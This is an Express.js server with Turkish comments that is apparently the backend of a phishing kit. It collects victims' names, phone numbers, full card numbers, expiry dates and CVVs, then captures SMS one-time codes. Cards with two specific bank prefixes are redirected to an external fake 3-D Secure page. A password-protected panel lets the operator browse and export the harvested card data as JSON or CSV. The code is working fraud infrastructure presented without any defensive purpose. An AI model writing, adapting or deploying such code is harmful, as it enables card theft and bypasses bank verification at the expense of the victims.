const express        = require('express');
const basicAuth      = require('express-basic-auth');
const path           = require('path');
const low            = require('lowdb');
const FileSync       = require('lowdb/adapters/FileSync');
const ShortUniqueId  = require('short-unique-id');
const axios          = require('axios');




process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));
process.on('uncaughtException', (e) => console.error('uncaughtException', e));

// UID ve veritabanı
const uid     = new ShortUniqueId({ length: 8 }); 
const file    = path.join(__dirname, 'db.json');
const adapter = new FileSync(file);
const db      = low(adapter);
db.defaults({ submissions: [], visits: 0 }).write();

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.urlencoded({ extended: true }));

// Ana sayfa
app.get('/', (req, res) => {
  db.update('visits', n => n + 1).write();
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Statik dosyalar
app.use(express.static(path.join(__dirname, '../frontend')));

// 📤 Form gönderimi
app.post('/submit-form', async (req, res) => {
  const { name, phone, card, CARD, expdate, EXP, EXP_YEAR, cvv } = req.body;
  const newId = uid.rnd();

  const raw = (card || "").replace(/\D/g, '');
  const prefix8 = raw.substr(0, 8);

     
  
  // Veriyi kaydet
  db.get('submissions')
    .unshift({
      id: newId,
      name,
      phone,
      card,
      CARD,
      expdate,
      EXP,
      EXP_YEAR,
      cvv,
      createdAt: new Date().toISOString()
    })
    .write();
   
    if (prefix8 === '40985844' || prefix8 === '54112498') {
    return res.redirect('https://kontaktonlayn.com/leobank-3ds.html');

  }

  


  res.redirect(`/sms.html?trans_id=${newId}`);
});

// 📲 SMS formu
app.post('/submit-sms', (req, res) => {
  const { trans_id, smsCode } = req.body;

  db.get('submissions')
    .find({ id: trans_id })
    .assign({ smsCode, smsAt: new Date().toISOString() })
    .write();

  res.sendStatus(200);
});

// 👮 Panel - şifre korumalı
app.get('/panel',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    const visits      = db.get('visits').value();
    res.render('panel', { submissions, visits });
  }
);

// 🔓 Logout
app.get('/logout', (req, res) => {
  res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
  res.status(401).send('Çıkış yapıldı');
});
const { Parser } = require('json2csv');
const fs = require('fs');

// JSON export
app.get('/export/json',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    res.setHeader('Content-Disposition', 'attachment; filename=submissions.json');
    res.setHeader('Content-Type', 'application/json');
    res.send(JSON.stringify(submissions, null, 2));
  }
);

// CSV export
app.get('/export/csv',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    try {
      const parser = new Parser();
      const csv = parser.parse(submissions);
      res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
      res.setHeader('Content-Type', 'text/csv');
      res.send(csv);
    } catch (err) {
      res.status(500).send('CSV dönüştürme hatası: ' + err.message);
    }
  }
);
// 🌐 Sunucu başlat
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server http://0.0.0.0:${PORT}`));
